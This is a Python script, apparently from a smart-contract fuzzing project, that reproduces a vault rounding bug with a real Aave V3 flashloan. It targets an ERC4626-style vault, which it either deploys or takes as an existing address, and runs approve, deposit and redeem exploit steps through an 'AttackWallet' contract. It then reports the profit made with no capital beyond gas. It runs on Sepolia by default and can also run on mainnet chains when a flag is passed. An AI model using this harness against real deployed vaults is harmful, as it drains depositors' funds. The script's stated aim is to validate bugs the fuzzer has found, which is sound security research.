#!/usr/bin/env python3
# Author: DanyTech
"""aave_flashloan_runner.py -- validates a flashloan-fundable bug for real,
using Aave V3's actual deployment on the given --chain (defaults to the
Sepolia testnet deployment).

Beyond Sepolia, every Aave V3 Pool address below was taken from the
official bgd-labs/aave-address-book repo and live-verified (real,
non-trivial bytecode at that address on that chain, confirmed via
eth_getCode) before being added -- the same discipline used for
src/evm/tokens/aave_transformer.rs's own table, after a pasted address
list for that file turned out to be entirely wrong. A chain not in
AAVE_V3_POOLS below simply isn't supported yet -- an honest gap, not a
silent reuse of Sepolia's (or any other chain's) address.

Only Sepolia has a free test-token faucet; on every other chain this
script expects the signer to already hold enough of --asset (no minting
step runs). Any chain outside chains.TESTNET_CHAINS additionally requires
--confirm-mainnet, exactly like auto_pipeline.py/batch_pipeline.py/
monitor.py -- this script submits a REAL flashloan transaction with real
borrowing-fee cost on mainnet, never a "test mode" for that.

This is the "zero-capital" half of this project's story made real: the
Rust fuzzer already finds bugs assuming effectively infinite balance
during its own in-memory simulation (see src/evm/onchain/flashloan.rs's
"buy tokens with infinite ETH via a real swap path" trick) -- a bug that
only pays off at large scale is still a bug worth knowing about, even
though no attacker's own wallet happens to hold millions of some token.
Rather than teach the Rust side a whole new Aave-specific simulation path
(a much bigger, separate undertaking -- see the limitations notes for why
multi-protocol flashloan *discovery* was deferred), this
script instead validates REPRODUCTION: does a bug the fuzzer already
proved via simulation actually hold up when the capital for it comes from
a real Aave V3 flashloan instead of the fuzzer's own pretend balance?

Flow against a real ERC4626-shaped Vault contract (deployed by this
script, or an address you already have) with a rounding bug in
redeem()/previewRedeem():
  1. Mint test DAI from Aave's own Sepolia faucet (permissionless --
     verified live before this script was written).
  2. Seed the Vault with a modest deposit (standing in for "other
     depositors' money already in the vault").
  3. Deploy/reuse the shared AttackWallet (onchain_scripts/contracts/
     AttackWallet.sol -- now Aave-flashloan-capable: see that file's own
     doc for executeOperation/startFlashLoan).
  4. Arm AttackWallet with the exploit's steps (approve, deposit, redeem)
     and call startFlashLoan: borrow DAI from the real Aave V3 Sepolia
     Pool, run those steps, let Aave pull back principal+premium.
  5. A SUCCESSFUL transaction is itself the proof: Aave's own Pool
     reverts the whole thing if repayment doesn't hold, so there is no
     separate "did it repay" check to write -- report the real on-chain
     profit (AttackWallet's DAI balance before vs. after) instead.

Usage:
    python3 aave_flashloan_runner.py \\
        --vault-sol contracts/demo/RoundingVault.sol --amount 100000 \\
        --key key.txt --recovery-wallet 0xYourMainWallet
    python3 aave_flashloan_runner.py --vault 0xAlreadyDeployedVault --amount 100000 \\
        --key key.txt --recovery-wallet 0xYourMainWallet

Verified live on Sepolia (100,000 DAI real flashloan, zero attacker
capital beyond gas): borrow -> seed-vault-funded 0.1% rounding bug ->
repay all held together for real, netting +50 DAI (0.1% bonus minus
Aave's 0.05% premium) in AttackWallet, confirmed both via the
transaction's own success (Aave reverts the whole tx if repayment
doesn't hold) and by reading the real DAI balances before/after.
"""
import argparse
import sys
from datetime import datetime, timezone
from pathlib import Path

from eth_abi import encode as abi_encode
from eth_account import Account
from web3 import Web3

from auto_pipeline import GAS_BUDGET_MARGIN, Tee, compile_contract, deploy, get_or_deploy_attack_wallet, selector, send_call, LOGS_DIR
# AAVE_V3_POOLS moved here (2026-11-02) so auto_pipeline.py can read the
# same table too without a circular import (this file already imports
# FROM auto_pipeline.py above) -- see chains.py's own doc comment on
# AAVE_V3_POOLS for the live-verification discipline behind every entry.
from chains import AAVE_V3_POOLS, known_chains, make_w3, native_symbol_for_w3, require_mainnet_confirmation, verify_rpc_identity
from gas_utils import GasBudget, GasBudgetExceeded, estimate_gas_limit, get_fee_fields
from wallet_policy import enforce_wallet_policy

# Verified live against the official aave-dao/aave-address-book repo
# (src/AaveV3Sepolia.sol) before this script was written -- never guessed.
AAVE_V3_SEPOLIA_POOL = "0x6Ae43d3271ff6888e7Fc43Fd7321a503ff738951"
AAVE_V3_SEPOLIA_FAUCET = "0xC959483DBa39aa9E78757139af0e9a2EDEb3f42D"
AAVE_V3_SEPOLIA_DAI = "0xFF34B3d4Aee8ddCd6F9AFFFB6Fe49bD371b8a357"
DAI_DECIMALS = 18


def erc20_balance(w3: Web3, token: str, holder: str) -> int:
    data = selector("balanceOf(address)") + abi_encode(["address"], [holder])
    raw = w3.eth.call({"to": token, "data": data})
    return int.from_bytes(raw, "big")


def build_parser() -> argparse.ArgumentParser:
    """Factored out of main() (2026-11-02) so dashboard_server.py can
    introspect the REAL CLI surface to build its own launch form from --
    see that file's own module doc. NOTE: --vault-sol/--vault form a
    mutually exclusive REQUIRED group at the argparse level -- the
    dashboard's generic form builder doesn't special-case that (both show
    as plain optional fields), so picking neither still fails the same
    way it would on the CLI (a clear argparse error in the live log),
    just without a dedicated "pick one" hint in the form itself."""
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--vault-sol", help="Path to a Vault.sol to compile and deploy fresh")
    group.add_argument("--vault", help="Address of an already-deployed Vault")
    parser.add_argument(
        "--asset",
        default=None,
        help="ERC20 asset to flashloan (default: Aave Sepolia test DAI, only when --chain sepolia; required otherwise)",
    )
    parser.add_argument("--amount", type=float, required=True, help="Flashloan amount, in whole tokens (e.g. 100000 for 100,000 DAI)")
    parser.add_argument("--seed-amount", type=float, default=1000.0, help="DAI to seed the vault with first, in whole tokens")
    parser.add_argument("--key", required=True, help="Path to the signer's private key file")
    parser.add_argument(
        "--recovery-wallet",
        required=True,
        help="Address this chain's shared AttackWallet instance is locked to -- must match whatever auto_pipeline.py/"
        "batch_pipeline.py already locked it to on this chain, since this script reuses the SAME registered "
        "instance (see get_or_deploy_attack_wallet). Enforced the same way every other onchain_scripts/ "
        "entry point enforces its recovery/safe wallet.",
    )
    parser.add_argument("--chain", default="sepolia", choices=known_chains())
    parser.add_argument(
        "--confirm-mainnet",
        action="store_true",
        help="Required for any --chain outside chains.TESTNET_CHAINS -- this script submits a real flashloan "
        "transaction with a real borrowing-fee cost.",
    )
    return parser


def main() -> int:
    args = build_parser().parse_args()

    if args.chain not in AAVE_V3_POOLS:
        raise SystemExit(
            f"No verified Aave V3 Pool address for chain '{args.chain}' yet. Known: {', '.join(sorted(AAVE_V3_POOLS))}"
        )
    if args.asset is None:
        if args.chain != "sepolia":
            raise SystemExit("--asset is required when --chain is not 'sepolia' (no default DAI address verified for this chain yet).")
        args.asset = AAVE_V3_SEPOLIA_DAI
    require_mainnet_confirmation(args.chain, args.confirm_mainnet)

    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    tee = Tee(LOGS_DIR / f"aave_flashloan_{run_id}.log")
    tee.log(f"=== aave_flashloan_runner run {run_id}: chain={args.chain} ===")

    w3 = make_w3(args.chain)
    verify_rpc_identity(args.chain, tee, w3=w3)
    acct = Account.from_key(Path(args.key).read_text().strip())
    enforce_wallet_policy(args.chain, acct.address, args.recovery_wallet)
    nonce_box = {"nonce": w3.eth.get_transaction_count(acct.address)}
    tee.log(f"Signer: {acct.address}")

    amount_wei = int(args.amount * 10**DAI_DECIMALS)
    seed_wei = int(args.seed_amount * 10**DAI_DECIMALS)

    # 1. Mint test DAI for the seed deposit (the flashloan amount itself
    # comes from Aave's own pool liquidity, not from us). Only Sepolia has
    # a free faucet -- everywhere else, the signer must already hold
    # enough of --asset; there is no mainnet "mint test tokens" step.
    signer_dai = erc20_balance(w3, args.asset, acct.address)
    if signer_dai < seed_wei:
        need = seed_wei - signer_dai
        if args.chain != "sepolia":
            raise SystemExit(
                f"Signer {acct.address} holds {signer_dai / 10**DAI_DECIMALS} of --asset, needs {seed_wei / 10**DAI_DECIMALS} "
                f"to seed the vault, and chain '{args.chain}' has no test-token faucet -- fund the signer with real "
                "--asset tokens first."
            )
        tee.log(f"Minting {need / 10**DAI_DECIMALS} DAI from the Aave Sepolia faucet ...")
        data = selector("mint(address,address,uint256)") + abi_encode(["address", "address", "uint256"], [args.asset, acct.address, need])
        if not send_call(w3, acct, nonce_box, AAVE_V3_SEPOLIA_FAUCET, data, tee, "Faucet mint"):
            tee.log("ERROR: faucet mint failed.")
            return 1

    # 2. Deploy or use the given Vault.
    if args.vault_sol:
        sol_path = Path(args.vault_sol)
        data = compile_contract(sol_path, tee) + abi_encode(["address"], [args.asset])
        vault = deploy(w3, acct, nonce_box, data, tee, f"Vault ({sol_path.name})")
    else:
        vault = Web3.to_checksum_address(args.vault)
        tee.log(f"Using existing vault {vault}")

    # 3. Seed it.
    tee.log(f"Seeding vault with {args.seed_amount} DAI ...")
    approve_data = selector("approve(address,uint256)") + abi_encode(["address", "uint256"], [vault, seed_wei])
    if not send_call(w3, acct, nonce_box, args.asset, approve_data, tee, "Approve vault for seed"):
        return 1
    deposit_data = selector("deposit(uint256,address)") + abi_encode(["uint256", "address"], [seed_wei, acct.address])
    if not send_call(w3, acct, nonce_box, vault, deposit_data, tee, "Seed deposit"):
        return 1

    # 4. Get/deploy the shared AttackWallet (redeploys automatically if its
    # source changed since the last deploy -- see get_or_deploy_attack_wallet).
    attack_wallet = get_or_deploy_attack_wallet(w3, acct, nonce_box, args.chain, args.recovery_wallet, tee)

    profit_token_before = erc20_balance(w3, args.asset, attack_wallet)

    # 5. Arm the exploit steps: approve the vault for the borrowed amount,
    # deposit it, then redeem the (inflated) shares straight back to
    # AttackWallet -- all three run inside Aave's executeOperation callback.
    targets = [args.asset, vault, vault]
    datas = [
        selector("approve(address,uint256)") + abi_encode(["address", "uint256"], [vault, amount_wei]),
        selector("deposit(uint256,address)") + abi_encode(["uint256", "address"], [amount_wei, attack_wallet]),
        selector("redeem(uint256,address,address)") + abi_encode(["uint256", "address", "address"], [amount_wei, attack_wallet, attack_wallet]),
    ]
    arm_data = selector("armFlashloanActions(address[],bytes[])") + abi_encode(
        ["address[]", "bytes[]"], [targets, datas]
    )
    # One real flashloan, one real gas-spending cap per call -- sized
    # from THAT call's own real eth_estimateGas right before sending it
    # (armFlashloanActions and startFlashLoan have very different real
    # costs -- the latter triggers the whole borrow -> armed steps ->
    # repay sequence internally -- so extrapolating one from the other
    # the way execute_plan's homogeneous-step sequential path does would
    # badly misjudge whichever one isn't the basis). GAS_BUDGET_MARGIN
    # matches gas_utils.py's own 10% convention.
    fee_fields = get_fee_fields(w3)

    def _single_call_budget(data: bytes, label: str) -> GasBudget:
        gas_est = estimate_gas_limit(
            w3,
            {
                "from": acct.address,
                "to": attack_wallet,
                "data": data,
                "value": 0,
                "chainId": w3.eth.chain_id,
                "nonce": nonce_box["nonce"],
            },
        )
        cap_wei = int(gas_est * fee_fields["maxFeePerGas"] * GAS_BUDGET_MARGIN)
        tee.log(f"Gas budget for {label}: {gas_est} gas * {GAS_BUDGET_MARGIN} margin = {Web3.from_wei(cap_wei, 'ether')} {native_symbol_for_w3(w3)} cap.")
        return GasBudget(cap_wei)

    try:
        if not send_call(w3, acct, nonce_box, attack_wallet, arm_data, tee, "armFlashloanActions", gas_budget=_single_call_budget(arm_data, "armFlashloanActions")):
            return 1

        pool = AAVE_V3_POOLS[args.chain]
        tee.log(f"Starting real Aave V3 flashloan on {args.chain} (Pool {pool}): {args.amount} of {args.asset} ...")
        start_data = selector("startFlashLoan(address,address,uint256,bytes)") + abi_encode(
            ["address", "address", "uint256", "bytes"], [pool, args.asset, amount_wei, b""]
        )
        # Estimated AFTER arm has already landed -- accurate specifically
        # because startFlashLoan's real behavior depends on the armed
        # steps already being in place; estimating it any earlier would
        # simulate against the wrong (unarmed) state.
        ok = send_call(w3, acct, nonce_box, attack_wallet, start_data, tee, "startFlashLoan", gas_budget=_single_call_budget(start_data, "startFlashLoan"))
    except GasBudgetExceeded as e:
        tee.log(f"ABORTED: {e}", alert=True)
        return 1

    profit_token_after = erc20_balance(w3, args.asset, attack_wallet)
    profit = (profit_token_after - profit_token_before) / 10**DAI_DECIMALS

    if ok:
        tee.log(
            f"=== SUCCESS: flashloan borrow -> exploit -> repay held together for real. "
            f"AttackWallet's DAI changed by {profit:+.6f} DAI with ZERO attacker capital beyond gas. ===",
            alert=True,
        )
    else:
        tee.log("=== Flashloan transaction reverted -- either the exploit steps failed or repayment didn't hold. ===", alert=True)

    tee.close()
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
